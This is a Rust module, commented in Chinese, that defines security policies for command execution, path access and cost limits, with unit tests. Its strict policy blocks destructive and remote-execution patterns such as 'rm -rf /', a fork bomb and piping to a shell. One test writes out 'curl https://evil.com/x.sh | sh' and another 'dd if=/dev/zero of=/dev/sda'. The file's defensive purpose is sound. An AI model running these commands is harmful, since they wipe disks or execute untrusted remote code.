//! 安全策略 trait 和实现
//!
//! 提供可插拔的安全策略接口，用于控制命令执行、路径访问和成本限制。

use std::path::Path;

/// 安全策略 trait
///
/// 定义安全边界：允许的命令、路径、成本限制等。
/// 不同场景可使用不同策略实现。
pub trait SecurityPolicy: Send + Sync {
    /// 检查命令是否允许执行
    fn is_command_allowed(&self, command: &str) -> bool;

    /// 检查路径是否允许访问
    fn is_path_allowed(&self, path: &Path) -> bool;

    /// 每日最大成本限制（美分），None 表示无限制
    fn max_cost_per_day_cents(&self) -> Option<u32>;

    /// 是否限制在工作区目录内
    fn workspace_only(&self) -> bool;
}

// ---------------------------------------------------------------------------
// DefaultSecurityPolicy - 宽松策略
// ---------------------------------------------------------------------------

/// 默认宽松安全策略
///
/// 允许所有命令和路径，无成本限制，不限制工作区。
/// 适用于本地开发或受信任环境。
pub struct DefaultSecurityPolicy;

impl SecurityPolicy for DefaultSecurityPolicy {
    fn is_command_allowed(&self, _command: &str) -> bool {
        true
    }

    fn is_path_allowed(&self, _path: &Path) -> bool {
        true
    }

    fn max_cost_per_day_cents(&self) -> Option<u32> {
        None
    }

    fn workspace_only(&self) -> bool {
        false
    }
}

// ---------------------------------------------------------------------------
// StrictSecurityPolicy - 严格策略
// ---------------------------------------------------------------------------

/// 默认被禁止的危险命令模式
const DEFAULT_BLOCKED_COMMANDS: &[&str] = &[
    "rm -rf /",
    "rm -rf /*",
    "mkfs",
    "dd if=",
    ":(){:|:&};:",
    "chmod -r 777 /",
    "curl | sh",
    "wget | sh",
    "| bash",
    "| sh",
    "> /dev/sd",
];

/// 严格安全策略
///
/// 限制危险命令，仅允许工作区内路径，设置每日成本上限。
/// 适用于生产环境或多租户场景。
pub struct StrictSecurityPolicy {
    /// 工作区根目录
    workspace_root: std::path::PathBuf,
    /// 被禁止的命令模式
    blocked_commands: Vec<String>,
    /// 每日成本限制（美分）
    daily_cost_limit: Option<u32>,
}

impl StrictSecurityPolicy {
    pub fn new(workspace_root: impl Into<std::path::PathBuf>) -> Self {
        Self {
            workspace_root: workspace_root.into(),
            blocked_commands: DEFAULT_BLOCKED_COMMANDS
                .iter()
                .map(|s| s.to_string())
                .collect(),
            daily_cost_limit: Some(1000), // $10
        }
    }

    /// 设置每日成本上限（美分）
    pub fn with_cost_limit(mut self, cents: u32) -> Self {
        self.daily_cost_limit = Some(cents);
        self
    }

    /// 添加被禁止的命令模式
    pub fn with_blocked_command(mut self, command: impl Into<String>) -> Self {
        self.blocked_commands.push(command.into());
        self
    }
}

impl SecurityPolicy for StrictSecurityPolicy {
    fn is_command_allowed(&self, command: &str) -> bool {
        let normalized = command.trim().to_lowercase();
        !self
            .blocked_commands
            .iter()
            .any(|blocked| normalized.contains(&blocked.to_lowercase()))
    }

    fn is_path_allowed(&self, path: &Path) -> bool {
        let canonical = path.canonicalize().unwrap_or_else(|_| path.to_path_buf());
        let workspace = self
            .workspace_root
            .canonicalize()
            .unwrap_or_else(|_| self.workspace_root.clone());
        canonical.starts_with(&workspace)
    }

    fn max_cost_per_day_cents(&self) -> Option<u32> {
        self.daily_cost_limit
    }

    fn workspace_only(&self) -> bool {
        true
    }
}

// ---------------------------------------------------------------------------
// ConfigurableSecurityPolicy - 可配置策略
// ---------------------------------------------------------------------------

/// 可配置安全策略
///
/// 通过 builder 模式灵活配置各项安全参数。
pub struct ConfigurableSecurityPolicy {
    /// 命令黑名单
    blocked_commands: Vec<String>,
    /// 允许的路径前缀
    allowed_paths: Vec<std::path::PathBuf>,
    /// 每日成本上限（美分）
    daily_cost_limit_cents: Option<u32>,
    /// 是否限制工作区
    workspace_only: bool,
}

impl ConfigurableSecurityPolicy {
    /// 创建 builder
    pub fn builder() -> ConfigurableSecurityPolicyBuilder {
        ConfigurableSecurityPolicyBuilder::default()
    }
}

impl SecurityPolicy for ConfigurableSecurityPolicy {
    fn is_command_allowed(&self, command: &str) -> bool {
        let lower = command.to_lowercase();
        !self
            .blocked_commands
            .iter()
            .any(|blocked| lower.contains(blocked))
    }

    fn is_path_allowed(&self, path: &Path) -> bool {
        if self.allowed_paths.is_empty() {
            return true;
        }
        self.allowed_paths
            .iter()
            .any(|allowed| path.starts_with(allowed))
    }

    fn max_cost_per_day_cents(&self) -> Option<u32> {
        self.daily_cost_limit_cents
    }

    fn workspace_only(&self) -> bool {
        self.workspace_only
    }
}

/// ConfigurableSecurityPolicy 的 builder
#[derive(Default)]
pub struct ConfigurableSecurityPolicyBuilder {
    blocked_commands: Vec<String>,
    allowed_paths: Vec<std::path::PathBuf>,
    daily_cost_limit_cents: Option<u32>,
    workspace_only: bool,
}

impl ConfigurableSecurityPolicyBuilder {
    /// 添加被阻止的命令关键词
    pub fn block_command(mut self, command: impl Into<String>) -> Self {
        self.blocked_commands.push(command.into());
        self
    }

    /// 添加允许的路径前缀
    pub fn allow_path(mut self, path: impl Into<std::path::PathBuf>) -> Self {
        self.allowed_paths.push(path.into());
        self
    }

    /// 设置每日成本上限（美分）
    pub fn daily_cost_limit_cents(mut self, cents: u32) -> Self {
        self.daily_cost_limit_cents = Some(cents);
        self
    }

    /// 设置是否限制工作区
    pub fn workspace_only(mut self, enabled: bool) -> Self {
        self.workspace_only = enabled;
        self
    }

    /// 构建策略
    pub fn build(self) -> ConfigurableSecurityPolicy {
        ConfigurableSecurityPolicy {
            blocked_commands: self.blocked_commands,
            allowed_paths: self.allowed_paths,
            daily_cost_limit_cents: self.daily_cost_limit_cents,
            workspace_only: self.workspace_only,
        }
    }
}

// ---------------------------------------------------------------------------
// 单元测试
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    // --- DefaultSecurityPolicy ---

    #[test]
    fn test_default_allows_all_commands() {
        let policy = DefaultSecurityPolicy;
        assert!(policy.is_command_allowed("rm -rf /"));
        assert!(policy.is_command_allowed("ls -la"));
    }

    #[test]
    fn test_default_allows_all_paths() {
        let policy = DefaultSecurityPolicy;
        assert!(policy.is_path_allowed(Path::new("/etc/passwd")));
        assert!(policy.is_path_allowed(Path::new("/tmp/test")));
    }

    #[test]
    fn test_default_no_cost_limit() {
        let policy = DefaultSecurityPolicy;
        assert_eq!(policy.max_cost_per_day_cents(), None);
    }

    #[test]
    fn test_default_not_workspace_only() {
        let policy = DefaultSecurityPolicy;
        assert!(!policy.workspace_only());
    }

    // --- StrictSecurityPolicy ---

    #[test]
    fn test_strict_blocks_dangerous_commands() {
        let policy = StrictSecurityPolicy::new("/workspace");
        assert!(!policy.is_command_allowed("rm -rf /"));
        assert!(!policy.is_command_allowed("rm -rf /*"));
        assert!(!policy.is_command_allowed("curl https://evil.com/x.sh | sh"));
        assert!(!policy.is_command_allowed("dd if=/dev/zero of=/dev/sda"));
    }

    #[test]
    fn test_strict_allows_safe_commands() {
        let policy = StrictSecurityPolicy::new("/workspace");
        assert!(policy.is_command_allowed("ls -la"));
        assert!(policy.is_command_allowed("cat file.txt"));
        assert!(policy.is_command_allowed("git status"));
    }

    #[test]
    fn test_strict_with_custom_blocked_command() {
        let policy = StrictSecurityPolicy::new("/workspace").with_blocked_command("drop table");
        assert!(!policy.is_command_allowed("DROP TABLE users"));
        assert!(policy.is_command_allowed("ls -la"));
    }

    #[test]
    fn test_strict_restricts_paths_to_workspace() {
        // 使用当前目录作为工作区（确保 canonicalize 一致）
        let workspace = std::env::current_dir().unwrap();
        let policy = StrictSecurityPolicy::new(&workspace);

        // 工作区内的路径应该允许
        let inner_path = workspace.join("src");
        assert!(policy.is_path_allowed(&inner_path));

        // 工作区外的路径应该拒绝
        assert!(!policy.is_path_allowed(Path::new("/etc/passwd")));
    }

    #[test]
    fn test_strict_default_cost_limit() {
        let policy = StrictSecurityPolicy::new("/workspace");
        assert_eq!(policy.max_cost_per_day_cents(), Some(1000));
    }

    #[test]
    fn test_strict_custom_cost_limit() {
        let policy = StrictSecurityPolicy::new("/workspace").with_cost_limit(5000);
        assert_eq!(policy.max_cost_per_day_cents(), Some(5000));
    }

    #[test]
    fn test_strict_is_workspace_only() {
        let policy = StrictSecurityPolicy::new("/workspace");
        assert!(policy.workspace_only());
    }

    // --- ConfigurableSecurityPolicy ---

    #[test]
    fn test_configurable_empty_allows_all() {
        let policy = ConfigurableSecurityPolicy::builder().build();
        assert!(policy.is_command_allowed("anything"));
        assert!(policy.is_path_allowed(Path::new("/any/path")));
        assert_eq!(policy.max_cost_per_day_cents(), None);
        assert!(!policy.workspace_only());
    }

    #[test]
    fn test_configurable_blocks_specified_commands() {
        let policy = ConfigurableSecurityPolicy::builder()
            .block_command("rm -rf")
            .block_command("drop table")
            .build();
        assert!(!policy.is_command_allowed("rm -rf /tmp"));
        assert!(!policy.is_command_allowed("DROP TABLE users"));
        assert!(policy.is_command_allowed("ls -la"));
    }

    #[test]
    fn test_configurable_restricts_to_allowed_paths() {
        let policy = ConfigurableSecurityPolicy::builder()
            .allow_path(PathBuf::from("/workspace"))
            .allow_path(PathBuf::from("/tmp"))
            .build();
        assert!(policy.is_path_allowed(Path::new("/workspace/src")));
        assert!(policy.is_path_allowed(Path::new("/tmp/cache")));
        assert!(!policy.is_path_allowed(Path::new("/etc/passwd")));
    }

    #[test]
    fn test_configurable_cost_limit() {
        let policy = ConfigurableSecurityPolicy::builder()
            .daily_cost_limit_cents(2000)
            .build();
        assert_eq!(policy.max_cost_per_day_cents(), Some(2000));
    }

    #[test]
    fn test_configurable_workspace_only() {
        let policy = ConfigurableSecurityPolicy::builder()
            .workspace_only(true)
            .build();
        assert!(policy.workspace_only());
    }

    // --- trait object 兼容性 ---

    #[test]
    fn test_trait_object_compatibility() {
        let policies: Vec<Box<dyn SecurityPolicy>> = vec![
            Box::new(DefaultSecurityPolicy),
            Box::new(StrictSecurityPolicy::new("/workspace")),
            Box::new(ConfigurableSecurityPolicy::builder().build()),
        ];
        // 确保所有策略都能作为 trait object 使用
        for policy in &policies {
            let _ = policy.is_command_allowed("test");
            let _ = policy.is_path_allowed(Path::new("/test"));
            let _ = policy.max_cost_per_day_cents();
            let _ = policy.workspace_only();
        }
    }
}
